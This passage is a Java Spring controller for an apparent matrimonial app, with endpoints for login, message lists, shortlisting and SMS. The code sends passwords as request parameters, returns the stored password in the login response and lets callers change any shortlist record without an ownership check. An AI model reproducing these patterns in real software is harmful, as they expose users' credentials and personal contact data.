
package com.xanadutec.coreflex.snehBandhanWebServices;

import java.awt.AlphaComposite;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.image.BufferedImage;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.DateFormat;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Collections;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

import javax.imageio.ImageIO;
import javax.mail.Session;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;

import org.apache.commons.io.FilenameUtils;
import org.codehaus.jackson.map.ObjectMapper;
import org.codehaus.jackson.map.ObjectWriter;
import org.hibernate.Criteria;
import org.hibernate.SessionFactory;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.util.Assert;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.multipart.MultipartHttpServletRequest;
import org.springframework.web.servlet.ModelAndView;

import com.xanadutec.coreflex.Email.EmailService;
import com.xanadutec.coreflex.Kit.KitService;
import com.xanadutec.coreflex.KitUpgradeAndPayment.KitUpgradeAndPaymentService;
import com.xanadutec.coreflex.MsgEmailSender.MsgEmailSender;
import com.xanadutec.coreflex.PaymentGateway.PaymentGatewayService;
import com.xanadutec.coreflex.ProfileView.ProfileViewService;
import com.xanadutec.coreflex.Registration.RegistrationService;
import com.xanadutec.coreflex.chat.ChatService;
import com.xanadutec.coreflex.forgotPassword.PasswordService;
import com.xanadutec.coreflex.login.LoginService;
import com.xanadutec.coreflex.model.Caste;
import com.xanadutec.coreflex.model.Chat;
import com.xanadutec.coreflex.model.CompareUserProfileView;
import com.xanadutec.coreflex.model.Country;
import com.xanadutec.coreflex.model.District_SubDistricts;
import com.xanadutec.coreflex.model.Education;
import com.xanadutec.coreflex.model.EducationCategory;
import com.xanadutec.coreflex.model.FcmNotification;
import com.xanadutec.coreflex.model.Kit;
import com.xanadutec.coreflex.model.Kit_Upgrade_Or_Reg_Details;
import com.xanadutec.coreflex.model.Kit_Upgrade_Or_Reg_History_Details;
import com.xanadutec.coreflex.model.MobileUserDetails;
import com.xanadutec.coreflex.model.Occupation;
import com.xanadutec.coreflex.model.OccupationCategory;
import com.xanadutec.coreflex.model.OnlineUser;
import com.xanadutec.coreflex.model.Package;
import com.xanadutec.coreflex.model.PartnerEducationAssociation;
import com.xanadutec.coreflex.model.PartnerOccupationAssociation;
import com.xanadutec.coreflex.model.PaymentGatewayTransactionSummary;
import com.xanadutec.coreflex.model.Religion;
import com.xanadutec.coreflex.model.RoleModel;
import com.xanadutec.coreflex.model.ServerInfo;
import com.xanadutec.coreflex.model.SortlistedProfileUserWithDate;
import com.xanadutec.coreflex.model.State_Country;
import com.xanadutec.coreflex.model.State_Districts;
import com.xanadutec.coreflex.model.Status;
import com.xanadutec.coreflex.model.UserModel;
import com.xanadutec.coreflex.model.UserModelDetails;
import com.xanadutec.coreflex.model.UserModelImagesName;
import com.xanadutec.coreflex.model.UserModelPartnerPreferances;
import com.xanadutec.coreflex.model.UserProfileView;
import com.xanadutec.coreflex.model.UserProfileViewForMessages;
import com.xanadutec.coreflex.model.chatView;
import com.xanadutec.coreflex.notification.NotificationService;
import com.xanadutec.coreflex.packageAndKit.PackageAndKitService;
import com.xanadutec.coreflex.sms.smsService;
import com.xanadutec.coreflex.userTask.UserService;

@Controller
public class FeedcomWebServicesController {

	@Autowired
	private KitService kitservice;
	@Autowired
	private LoginService loginService;
	@Autowired
	UserService userService;
	@Autowired
	ProfileViewService profileViewService;
	@Autowired
	EmailService emailService;
	@Autowired
	PackageAndKitService packageAndKitService;
	@Autowired
	KitService kitService;
	@Autowired
	RegistrationService registrationServicec;
	@Autowired
	private smsService smsservice;
	@Autowired
	KitUpgradeAndPaymentService kitUpgradeAndPaymentService;
	@Autowired
	com.xanadutec.coreflex.setup.SetupService setupService;
	@Autowired
	private SessionFactory sessionFactory;
	@Autowired
	ChatService chatService;
	@Autowired
	NotificationService notificationService;
	@Autowired
	PaymentGatewayService paymentGatewayService;
	@Autowired
	private PasswordService passwordservice;

	@RequestMapping(value = "/sneh/login", method = RequestMethod.POST)
	@ResponseBody
	public String login(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password, @RequestParam("deviceToken") String deviceToken) {
		
		UserModel userModel = loginService.getUserByUnamePassword(username, password);
		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}

		} catch (Exception e) {

		}

		//Kit kit = kitservice.findKitByKitUserNamePassword(username, password);

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
				if (userModel != null) {
					if (deviceToken != null) {
						userModel.setDeviceToken(deviceToken);
						userService.addUser(userModel);
					}
					UserModelDetails modelDetails = userService.getUserdetails(userModel);
					UserModelImagesName imagesNames = userService.getImageNameAccordingToUserModel(userModel);
					UserModelPartnerPreferances userPartnerPreferances = userService.getUserModelPartnerPreferancesByUserModelId(userModel);

					MobileUserDetails mobileUserDetails = new MobileUserDetails();
					/* user */
					mobileUserDetails.setUserId(userModel.getUserId() + "");
					mobileUserDetails.setUserName(userModel.getUserName());
					mobileUserDetails.setPassword(userModel.getPassword());
					mobileUserDetails.setUserRoll(userModel.getUserRoll().getId() + "");
					mobileUserDetails.setMobileNo(userModel.getMobileNo() + "");
					mobileUserDetails.setFullName(userModel.getFirstName() + "");
					try {
						mobileUserDetails.setKit(userModel.getKit().getKit_id() + "");
					} catch (Exception e) {

					}
					/* user Details */
					mobileUserDetails.setAboutMe(modelDetails.getAboutMe());
					mobileUserDetails.setMaterialStatus(modelDetails.getMaterialStatus());
					mobileUserDetails.setPhysicalStatus(modelDetails.getPhysicalStatus());
					mobileUserDetails.setHeight(modelDetails.getHeight());
					mobileUserDetails.setWeight(modelDetails.getWeight());
					mobileUserDetails.setCountry(modelDetails.getCountry().getCountry_id() + "");
					;
					mobileUserDetails.setState_Country(modelDetails.getState_Country().getState_Country_id() + "");
					mobileUserDetails.setDistricts(modelDetails.getDistricts().getState_district_id() + "");
					mobileUserDetails
							.setSubDistricts(modelDetails.getSubDistricts().getDistrict_subDistricts_id() + "");
					mobileUserDetails.setCaste(modelDetails.getCaste().getCaste_id() + "");
					mobileUserDetails.setEducation(modelDetails.getEducation().getEducation_id() + "");
					mobileUserDetails.setOccupation(modelDetails.getOccupation().getOccupation_id() + "");
					mobileUserDetails.setEmployeedIn(modelDetails.getEmployeedIn());
					mobileUserDetails.setIncomeType(modelDetails.getIncomeType());
					mobileUserDetails.setIncomeAmount(modelDetails.getIncomeAmount());
					mobileUserDetails.setFamilyClass(modelDetails.getFamilyClass());
					mobileUserDetails.setFamilyType(modelDetails.getFamilyType());
					mobileUserDetails.setFamilyValues(modelDetails.getFamilyValues());
					mobileUserDetails.setEating(modelDetails.getEating());
					mobileUserDetails.setDrink(modelDetails.getDrink());
					mobileUserDetails.setSmoke(modelDetails.getSmoke());
					mobileUserDetails.setBodyType(modelDetails.getBodyType());
					mobileUserDetails.setComplexion(modelDetails.getComplexion());
					mobileUserDetails.setRegistrationDate(modelDetails.getRegistrationDate());
					mobileUserDetails.setProfileUpdateDate(modelDetails.getProfileUpdateDate());
					mobileUserDetails.setLastLoginDate(modelDetails.getLastLoginDate());
					mobileUserDetails.setGender(modelDetails.getGender());
					mobileUserDetails.setDateOfBirth(modelDetails.getDateOfBirth());
					mobileUserDetails.setEmail(modelDetails.getEmail());
					mobileUserDetails.setMobileNum(modelDetails.getMobileNum());
					mobileUserDetails.setProfileCreatedFor(modelDetails.getProfileCreatedFor());

					Date date = modelDetails.getDateOfBirth();
					try {
						Calendar calendar = new GregorianCalendar();
						calendar.setTime(date);
						Date d1 = new GregorianCalendar(calendar.get(Calendar.YEAR), calendar.get(Calendar.MONTH),
								calendar.get(Calendar.DAY_OF_MONTH), 23, 59).getTime();
						Date today = new Date();
						long diff = today.getTime() - d1.getTime();
						long i = diff / (1000 * 60 * 60 * 24);
						int dob = (int) (i / 365);
						mobileUserDetails.setAge(dob + "");
					} catch (Exception e) {

					}

					/* user Partner Preferance */
					try {
						mobileUserDetails.setPartnerPrefMaterialStatus(userPartnerPreferances.getMaterialStatus());
					} catch (Exception e) {

					}
					try {
						mobileUserDetails.setPartnerPrefPhysicalStatus(userPartnerPreferances.getPhysicalStatus());
					} catch (Exception e) {

					}
					try {
						mobileUserDetails.setPartnerPrefHeightFrom(
								String.format("%.2f", userPartnerPreferances.getHeightFrom()));
					} catch (Exception e) {

					}
					try {

						mobileUserDetails
								.setPartnerPrefHeightTo(String.format("%.2f", userPartnerPreferances.getHeightTo()));
					} catch (Exception e) {

					}
					try {

						mobileUserDetails
								.setPartnerPrefCountry(userPartnerPreferances.getCountry().getCountry_id() + "");
					} catch (Exception e) {

					}
					////////////////////////////
					try {
						mobileUserDetails.setPartnerPrefState_Country(
								userPartnerPreferances.getState_Country().getState_Country_id() + "");
					} catch (Exception e) {

					}
					try {
						mobileUserDetails.setPartnerPrefDistricts(
								userPartnerPreferances.getDistricts().getState_district_id() + "");
					} catch (Exception e) {

					}
					try {
						mobileUserDetails
								.setPartnerPrefReligion(userPartnerPreferances.getReligion().getReligion_id() + "");
					} catch (Exception e) {

					}
					try {
						mobileUserDetails.setPartnerPrefCaste(userPartnerPreferances.getCaste().getCaste_id() + "");
					} catch (Exception e) {

					}
					try {
						mobileUserDetails.setPartnerPrefEmployeedIn(userPartnerPreferances.getEmployeedIn());
					} catch (Exception e) {

					}

					try {
						mobileUserDetails.setPartnerPrefIncomeType(userPartnerPreferances.getIncomeType());
					} catch (Exception e) {

					}

					try {
						mobileUserDetails.setPartnerPrefIncomeAmount(userPartnerPreferances.getIncomeAmount());
					} catch (Exception e) {

					}
					try {
						mobileUserDetails.setPartnerPrefFamilyClass(userPartnerPreferances.getFamilyClass());
					} catch (Exception e) {

					}
					try {
						mobileUserDetails.setPartnerPrefFamilyType(userPartnerPreferances.getFamilyType());
					} catch (Exception e) {

					}
					try {
						mobileUserDetails.setPartnerPrefFamilyValues(userPartnerPreferances.getFamilyValues());
					} catch (Exception e) {

					}
					try {
						mobileUserDetails.setPartnerPrefEating(userPartnerPreferances.getEating());
					} catch (Exception e) {

					}
					///
					try {
						mobileUserDetails.setPartnerPrefDrink(userPartnerPreferances.getDrink());

					} catch (Exception e) {

					}
					try {
						mobileUserDetails.setPartnerPrefSmoke(userPartnerPreferances.getSmoke());
					} catch (Exception e) {

					}
					try {
						mobileUserDetails.setPartnerPrefBodyType(userPartnerPreferances.getBodyType());
					} catch (Exception e) {

					}

					try {
						mobileUserDetails.setPartnerPrefComplexion(userPartnerPreferances.getComplexion());
					} catch (Exception e) {

					}

					/* user imagesNames */
					try {
						mobileUserDetails.setImageNames(imagesNames.getImageNames());
						

					} catch (Exception e) {

					}
					
					try {
						mobileUserDetails.setKundaliImage(imagesNames.getKundaliImage());
					} catch (Exception e) {

					}

					try {

						//List<PartnerEducationAssociation> educationAssociation = userService.getPartnerEducationAssociationByUserModel(userModel);
						List<EducationCategory>educationCatagory = userService.getEducationCatagory(userModel);
						String edAssociaton = "";
						for (EducationCategory partnerEducationAssociation : educationCatagory) {
							edAssociaton = edAssociaton + partnerEducationAssociation.getEdu_cat_id() + ",";
						}
						mobileUserDetails.setEduAssociation(edAssociaton);

					} catch (Exception e) {

					}

					try {
						//List<PartnerOccupationAssociation> partnerOccAssociation = userService.getPartnerOccuptionAssociationByUserModel(userModel);
						List<OccupationCategory>cocupationCatagory = userService.getPartnerOccuptionCatagory(userModel);
						String occAssociation = "";
						for (OccupationCategory partnerOccupationAssociation : cocupationCatagory) {
							occAssociation = occAssociation + partnerOccupationAssociation.getOccu_id() + ",";
						}
						mobileUserDetails.setOccAssociation(occAssociation);

					} catch (Exception e) {

					}
					
					
					// Code for Onluine User
					try {
						
						if(modelDetails !=null)
						{
							 OnlineUser onlineUser= userService.getonlineUser(modelDetails.getUserModel());
							 if(onlineUser!=null)
							 {
								 userService.updateOnlineUser(modelDetails.getUserModel());
							 }
							 else
							 {
								 userService.saveOnlineUserInformation(modelDetails.getUserModel(), modelDetails.getGender().trim());
							 }
							  
							
						}
						
					} catch (Exception e) {
					}
					js.put("userInfo", ow.writeValueAsString(mobileUserDetails));
				}

				js.put("code", "1000");
				json = js.toString();
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {

			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				try {
					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
				} catch (JSONException e1) {
					e1.printStackTrace();
				}
				e.printStackTrace();
			}
		}
		return json;

	}

	@RequestMapping(value = "/sneh/login/latest_inbox_conversation", method = RequestMethod.POST)
	@ResponseBody
	public String latest_inbox_conversation(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password) {
		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}

		} catch (Exception e) {

		}

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);
				List<UserProfileViewForMessages> profileViews = userService.getlistOfMessagesAndEmailByUser(request,
						userModel);
				try {
					js.put("inbox_conversation", ow.writeValueAsString(profileViews));
					js.put("code", "1000");
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		return json;
	}

	@RequestMapping(value = "/sneh/login/changeSortlistStatus", method = RequestMethod.POST)
	@ResponseBody
	public String changeSortlistStatus(@RequestParam("username") String username,
			@RequestParam("password") String password, @RequestParam("sortlistedId") String sortlistedId,
			@RequestParam("status") String status, ModelMap model, HttpServletRequest request) {
		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}

		} catch (Exception e) {

		}

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			HttpSession httpSession = request.getSession();
			httpSession.setAttribute("ActUserName", userModel.getFirstName());
			httpSession.setAttribute("ActUserId", userModel);
			try {

				SortlistedProfileUserWithDate profileUserWithDate = new SortlistedProfileUserWithDate();
				profileUserWithDate.setSortlistId(Long.parseLong(sortlistedId));

				if (profileUserWithDate != null) {
				}
				profileUserWithDate = kitUpgradeAndPaymentService
						.getSortlistedProfileUserWithDateById(profileUserWithDate);
				profileUserWithDate.setStatusDate(new Date());
				profileUserWithDate.setStatus(status);
				kitUpgradeAndPaymentService.updateSortlistedProfileUserWithDate(profileUserWithDate);

				try {
					js.put("status", profileUserWithDate.getStatus());
					js.put("date", profileUserWithDate.getStatusDate().getTime());
					js.put("code", "1000");
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}
				json = js.toString();

				return json;
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		return json;
	}

	@RequestMapping(value = "/sneh/login/latest_sent_conversation", method = RequestMethod.POST)
	@ResponseBody
	public String latest_sent_conversation(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password) {

		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}

		} catch (Exception e) {

		}

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);
				List<UserProfileViewForMessages> profileViews = userService.getlistOfSentMessagesAndEmail(request,
						userModel);
				try {
					js.put("sent_conversation", ow.writeValueAsString(profileViews));
					js.put("code", "1000");
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		return json;
	}

	@RequestMapping(value = "/sneh/login/invitation_conversation", method = RequestMethod.POST)
	@ResponseBody
	public String invitation_conversation(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password) {

		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}

		} catch (Exception e) {

		}

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);
				List<UserProfileViewForMessages> profileViews;
				List<UserProfileViewForMessages> profileViewsOne;
				Map<String, List<UserProfileViewForMessages>> map = userService.getlistOfInvitationByUser(request,
						userModel);
				profileViews = map.get("ByYou");
				profileViewsOne = map.get("ByOther");
				try {
					js.put("invitationByYou", ow.writeValueAsString(profileViews));
					js.put("invitationByOther", ow.writeValueAsString(profileViewsOne));
					js.put("code", "1000");
					json = js.toString();
					httpSession.invalidate();
				} catch (Exception e) {
					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		return json;
	}

	@RequestMapping(value = "/sneh/login/accepted_conversation", method = RequestMethod.POST)
	@ResponseBody
	public String accepted_conversation(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password) {

		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}

		} catch (Exception e) {

		}

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);
				List<UserProfileViewForMessages> profileViews;
				List<UserProfileViewForMessages> profileViewsOne;

				Map<String, List<UserProfileViewForMessages>> map = userService
						.getlistOfAcceptedInvitationByUser(request, userModel);
				profileViews = map.get("ByYou");
				profileViewsOne = map.get("ByOther");

				try {
					js.put("invitationByYou", ow.writeValueAsString(profileViews));
					js.put("invitationByOther", ow.writeValueAsString(profileViewsOne));
					js.put("code", "1000");
					json = js.toString();
					httpSession.invalidate();
				} catch (Exception e) {
					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		return json;
	}

	@RequestMapping(value = "/sneh/login/rejected_conversation", method = RequestMethod.POST)
	@ResponseBody
	public String rejected_conversation(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password) {

		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}

		} catch (Exception e) {

		}

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);

				List<UserProfileViewForMessages> profileViews;
				List<UserProfileViewForMessages> profileViewsOne;

				Map<String, List<UserProfileViewForMessages>> map = userService
						.getlistOfRejectedInvitationByUser(request, userModel);
				profileViews = map.get("ByYou");
				profileViewsOne = map.get("ByOther");

				try {
					js.put("invitationByYou", ow.writeValueAsString(profileViews));
					js.put("invitationByOther", ow.writeValueAsString(profileViewsOne));
					js.put("code", "1000");
					json = js.toString();
					httpSession.invalidate();
				} catch (Exception e) {
					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		return json;
	}

	@RequestMapping(value = "/sneh/login/ShortlistUser", method = RequestMethod.POST)
	@ResponseBody
	public String ShortlistUser(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password, @RequestParam("visitorId") String VisitorId,@RequestParam("type") String type) {
		
		
		JSONObject js = new JSONObject();
		String json = null;
		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}

		} catch (Exception e) {

		}
		JSONObject obj;
		if ((userModel != null)) {
			try {
				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);

				try {
					List<Kit_Upgrade_Or_Reg_Details> kit_Upgrade_Or_Reg_Details = kitUpgradeAndPaymentService
							.getKit_upgrade_or_reg_detailsByUserModel(userModel);

					Kit_Upgrade_Or_Reg_Details details;
					if (kit_Upgrade_Or_Reg_Details.size() > 0) {

						details = kit_Upgrade_Or_Reg_Details.get(0);

						long diff = details.getExpiryDate().getTime() - new Date().getTime();

						long diffMinutes = diff / (60 * 1000) % 60;
						long diffHours = diff / (60 * 60 * 1000) % 24;
						long diffDays = diff / (24 * 60 * 60 * 1000);

						int flag = 0;
						if (diffDays >= 1) {
							flag = 1;
						} else if (diffHours >= 1) {
							flag = 1;
						} else if (diffMinutes >= 1) {
							flag = 1;
						}

						if (flag == 1) {

							int profileCount = details.getNo_of_profile();
							UserModel visitedModel = new UserModel();
							visitedModel.setUserId(Long.parseLong(VisitorId));

							SortlistedProfileUserWithDate sortlistedProfileUserWithDate = kitUpgradeAndPaymentService
									.getSortlistedProfileUser(userModel, visitedModel);

							if (profileCount > 0 || sortlistedProfileUserWithDate != null) {
								js.put("profileCount", true);

								if (sortlistedProfileUserWithDate == null) {
									sortlistedProfileUserWithDate = new SortlistedProfileUserWithDate();
									sortlistedProfileUserWithDate.setSortlistedDate(new Date());
									sortlistedProfileUserWithDate.setUserModel(userModel);
									sortlistedProfileUserWithDate.setSortlistedUserModel(visitedModel);
									sortlistedProfileUserWithDate.setStatus("INVITATION");

									kitUpgradeAndPaymentService
											.saveSortlistedProfileUserWithDate(sortlistedProfileUserWithDate);

									details.setNo_of_profile(details.getNo_of_profile() - 1);
									kitUpgradeAndPaymentService.updateKit_upgrade_or_reg_details(details);

								}

								UserModelDetails modelDetails = userService.getUserdetails(visitedModel);

								Calendar cal = Calendar.getInstance();
								cal.setTime(modelDetails.getDateOfBirth());

								js.put("dob",
										cal.get(Calendar.YEAR) + " - " + Integer.parseInt(cal.get(Calendar.MONTH) + "")
												+ " - " + cal.get(Calendar.DATE));
								js.put("mobile", modelDetails.getMobileNum());
								js.put("email", modelDetails.getEmail());
								js.put("Address",
										modelDetails.getDistricts().getDistrict_Name() + ",  "
												+ modelDetails.getState_Country().getState_Name() + ",  "
												+ modelDetails.getCountry().getCountry_Name());
								json = js.toString();
							} else {
								js.put("profileCount", false);

							}
							
							
						}

					} else {
						js.put("profileCount", false);
					}
					try {
						js.put("code", "1000");
						json = js.toString();
						httpSession.invalidate();

					} catch (Exception e) {

						js.put("code", "1001");
						js.put("ErrorMessage", e.getMessage());
						json = js.toString();
						e.printStackTrace();
					}

				} catch (Exception e) {
					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}
				
				
				
				if(type.equalsIgnoreCase("sort"))
				{
					
				try {
					
					org.hibernate.Session session=sessionFactory.openSession();
					final UserModel userFrom=userModel;
					final UserModel userTo=(UserModel) session.get(UserModel.class, Long.parseLong(VisitorId));
					final HttpServletRequest request2=request;
					session.close();
				Thread tt=new Thread(new Runnable() {
					
					@Override
					public void run() {
						
						
						try {
							
							FcmNotification fcmNotification = notificationService.getFcmNotification();
							notificationService.sendSortListedFcmNotification(userFrom, userTo, fcmNotification, request2);
							
						} catch (Exception e) {
							
						}
						
						
					}
				});
				
				tt.start();
				
			} catch (Exception e) {
				
			}
		}

				ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
				json = js.toString();
				return json;
			} catch (Exception e) {
				e.printStackTrace();
			}
			
			
			
			
			
		}
		return json;

	}

	@RequestMapping(value = "/sneh/login/ShortlistSendMSG", method = RequestMethod.POST)
	@ResponseBody
	public String ShortlistSendMSG(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password, @RequestParam("visitorId") String ShortlistVisitedId,
			@RequestParam("message") String ShortlistMSG) {
		JSONObject js = new JSONObject();
		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}

		} catch (Exception e) {

		}
		String json = null;
		try {

			HttpSession httpSession = request.getSession();
			httpSession.setAttribute("ActUserName", userModel.getFirstName());
			httpSession.setAttribute("ActUserId", userModel);

			try {
				if (userModel != null) {

					List<Kit_Upgrade_Or_Reg_Details> kit_Upgrade_Or_Reg_Details = kitUpgradeAndPaymentService
							.getKit_upgrade_or_reg_detailsByUserModel(userModel);

					Kit_Upgrade_Or_Reg_Details details;
					if (kit_Upgrade_Or_Reg_Details.size() > 0) {

						details = kit_Upgrade_Or_Reg_Details.get(0);
						long diff = details.getExpiryDate().getTime() - new Date().getTime();

						long diffMinutes = diff / (60 * 1000) % 60;
						long diffHours = diff / (60 * 60 * 1000) % 24;
						long diffDays = diff / (24 * 60 * 60 * 1000);
						int flag = 0;
						if (diffDays >= 1) {
							flag = 1;
						} else if (diffHours >= 1) {
							flag = 1;
						} else if (diffMinutes >= 1) {
							flag = 1;
						}

						if (flag == 1) {

							int profileCount = details.getNo_of_profile();

							UserModel visitedModel = new UserModel();
							visitedModel.setUserId(Long.parseLong(ShortlistVisitedId));

							SortlistedProfileUserWithDate sortlistedProfileUserWithDate = kitUpgradeAndPaymentService
									.getSortlistedProfileUser(userModel, visitedModel);

							if (profileCount > 0 || sortlistedProfileUserWithDate != null) {

								js.put("profileCount", true);

								if (details.getNo_of_email() > 0) {
									UserModelDetails modelDetails = userService.getUserdetails(visitedModel);
									// send email code goes here
									MsgEmailSender.sendSms(modelDetails.getMobileNum(), ShortlistMSG, "", smsservice);
									details.setNo_of_msg(details.getNo_of_msg() - 1);
									kitUpgradeAndPaymentService.updateKit_upgrade_or_reg_details(details);
								} else {
									js.put("profileCount", false);
								}

							} else {
								js.put("profileCount", false);
							}
						}

					} else {
						js.put("profileCount", false);
					}

					try {
						js.put("code", "1000");
						json = js.toString();
						httpSession.invalidate();

					} catch (Exception e) {

						js.put("code", "1001");
						js.put("ErrorMessage", e.getMessage());
						json = js.toString();
						e.printStackTrace();
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
				js.put("code", "1001");
				js.put("ErrorMessage", e.getMessage());
				json = js.toString();
				e.printStackTrace();
				httpSession.invalidate();
			}
			ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
			json = js.toString();
			return json;
		} catch (Exception e) {

			e.printStackTrace();
		}
		return json;

	}

	@RequestMapping(value = "/sneh/login/ShortlistSendEmail", method = RequestMethod.POST)
	@ResponseBody
	public String ShortlistSendEmail(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password, @RequestParam("visitorId") String ShortlistVisitedId,
			@RequestParam("emailText") String ShortlistEmail) {

		UserModel userModel = loginService.getUserByUnamePassword(username, password);
		String json = null;
		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
